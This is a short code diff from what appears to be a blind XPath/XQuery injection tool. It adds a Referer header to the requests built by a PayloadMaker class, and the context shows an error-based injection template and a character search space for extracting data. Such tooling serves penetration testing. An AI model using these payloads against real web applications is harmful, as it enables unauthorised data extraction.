@@ -89,7 +89,7 @@ class PayloadMaker(object):
         self.search_space = string.ascii_letters + string.digits + " .-"
         self.agent = Agent(reactor)
 
-        self._headers = Headers({"User-Agent":[config.user_agent], "Content-Type":["application/x-www-form-urlencoded"], "Cookie":[config.cookie]})
+        self._headers = Headers({"User-Agent":[config.user_agent], "Referer":[config.referer], "Content-Type":["application/x-www-form-urlencoded"], "Cookie":[config.cookie]})
 
         if config.error_keyword:
             self.BASE = string.Template("' and (if ($payload) then error() else 0) and '1' = '1".replace("'", config.quote_character))
